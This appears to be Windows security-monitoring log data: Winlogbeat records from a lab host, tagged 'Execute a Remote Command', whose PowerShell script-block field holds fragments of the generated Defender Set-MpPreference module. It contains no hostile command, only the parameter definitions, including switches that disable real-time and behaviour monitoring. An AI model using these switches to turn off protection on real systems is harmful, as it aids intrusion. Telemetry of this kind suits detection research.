$__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {\n          [object]$__cmdletization_value = ${CloudExtendedTimeout}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {\n          [object]$__cmdletization_value = ${EnableNetworkProtection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {\n          [object]$__cmdletization_value = ${EnableControlledFolderAccess}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_valu"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'root\\Microsoft\\Windows\\Defender\\MSFT_MpPreference'\n$script:ClassVersion = '1.0'\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Set-MpPreference\n{\n    [CmdletBinding(PositionalBinding=$false)]\n    \n    \n    param(\n    \n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionPath},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionExtension},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionProcess},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ExclusionIpAddress},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('rtsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Both','Incoming','Outcoming')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection]\n    ${RealTimeScanDirection},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('qpiad')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${QuarantinePurgeItemsAfterDelay},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('rsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\n    ${RemediationScheduleDay},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('rst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [datetime]\n    ${RemediationScheduleTime},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('raat')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${ReportingAdditionalActionTimeOut},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('rcto')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${ReportingCriticalFailureTimeOut},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('rncto')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${ReportingNonCriticalTimeOut},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('saclf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [byte]\n    ${ScanAvgCPULoadFactor},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('csbr')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${CheckForSignaturesBeforeRunningScan},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('spiad')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${ScanPurgeItemsAfterDelay},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('soiie')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${ScanOnlyIfIdleEnabled},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('QuickScan','FullScan')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType]\n    ${ScanParameters},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('scsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\n    ${ScanScheduleDay},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('scsqst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [datetime]\n    ${ScanScheduleQuickScanTime},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('scst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [datetime]\n    ${ScanScheduleTime},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('tfsso')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${ThrottleForScheduledScanOnly},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigfagp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${SignatureFirstAuGracePeriod},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigagp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${SignatureAuGracePeriod},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigdufss')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${SignatureDefinitionUpdateFileSharesSources},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigduoswo')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${SignatureDisableUpdateOnStartupWithoutEngine},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sfo')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${SignatureFallbackOrder},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ssp','SecurityIntelligenceLocation','ssl')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${SharedSignaturesPath},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigsd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]\n    ${SignatureScheduleDay},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigst')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [datetime]\n    ${SignatureScheduleTime},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('siguci')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${SignatureUpdateCatchupInterval},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigui')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${SignatureUpdateInterval},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigbui')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${SignatureBlobUpdateInterval},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('sigbfs')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${SignatureBlobFileSharesSources},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('mcupd')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${MeteredConnectionUpdates},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('anpws')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${AllowNetworkProtectionOnWinServer},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ddtgp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableDatagramProcessing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableCpuThrottleOnIdleScans},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Disabled','Basic','Advanced')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType]\n    ${MAPSReporting},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType]\n    ${SubmitSamplesConsent},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dae')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableAutoExclusions},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dpm')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisablePrivacyMode},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('rstt')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${RandomizeScheduleTaskTimes},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('srt')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${SchedulerRandomizationTime},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dbm')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableBehaviorMonitoring},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dips')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableIntrusionPreventionSystem},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dioavp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableIOAVProtection},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('drtm')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableRealtimeMonitoring},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dscrptsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableScriptScanning},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('darchsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableArchiveScanning},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dcfsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableCatchupFullScan},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dcqsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableCatchupQuickScan},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('demsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableEmailScanning},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('drdsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableRemovableDriveScanning},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('drp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableRestorePoint},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dsmndfsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableScanningMappedNetworkDrivesForFullScan},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dsnf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableScanningNetworkFiles},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${UILockdown},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('tiddefaci')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [long[]]\n    ${ThreatIDDefaultAction_Ids},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('tiddefaca')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\n    ${ThreatIDDefaultAction_Actions},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('unktdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\n    ${UnknownThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ltdefac')]\n    [ValidateNotNull()]\n    [Va"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"lidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\n    ${LowThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('mtdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\n    ${ModerateThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('htdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\n    ${HighThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('stdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction]\n    ${SevereThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Set0')]\n    [switch]\n    ${Force},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dbaf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableBlockAtFirstSeen},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Disabled','Enabled','AuditMode')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType]\n    ${PUAProtection},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Default','Moderate','High','HighPlus','ZeroTolerance')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType]\n    ${CloudBlockLevel},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('cloudextimeout')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${CloudExtendedTimeout},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Disabled','Enabled','AuditMode')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType]\n    ${EnableNetworkProtection},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('Disabled','Enabled','AuditMode','BlockDiskModificationOnly','AuditDiskModificationOnly')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ControlledFolderAccessType]\n    ${EnableControlledFolderAccess},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${AttackSurfaceReductionOnlyExclusions},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ControlledFolderAccessAllowedApplications},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ControlledFolderAccessProtectedFolders},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${AttackSurfaceReductionRules_Ids},\n\n    [Parameter(ParameterSetName='Set0')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\n    ${AttackSurfaceReductionRules_Actions},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('elcp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${EnableLowCpuPriority},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('efhc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${EnableFileHashComputation},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('efsobp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${EnableFullScanOnBatteryPower},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ppurl')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${ProxyPacUrl},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('proxsrv')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string]\n    ${ProxyServer},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('proxbps')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ProxyBypass},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('fupo')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${ForceUseProxyOnly},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dtlsp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableTlsParsing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dhttpp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableHttpParsing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ddnsp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableDnsParsing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ddnstcpp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableDnsOverTcpParsing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dsshp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableSshParsing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('puc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\n    ${PlatformUpdatesChannel},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('euc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('NotConfigured','Beta','Preview','Staged','Broad')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\n    ${EngineUpdatesChannel},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('duc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [ValidateSet('NotConfigured','Staged','Broad')]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType]\n    ${DefinitionUpdatesChannel},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dgr')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableGradualRelease},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('anpdl')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${AllowNetworkProtectionDownLevel},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('adpows')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${AllowDatagramProcessingOnWinServer},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('ednss')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${EnableDnsSinkhole},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dicf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableInboundConnectionFiltering},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('drdpp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableRdpParsing},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('dnppt')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [bool]\n    ${DisableNetworkProtectionPerfTelemetry},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('tlps')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [uint32]\n    ${TrustLabelProtectionStatus},\n\n    [Parameter(ParameterSetName='Set0')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Set0')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Set0')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\n          [object]$__cmdletization_value = ${ExclusionPath}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        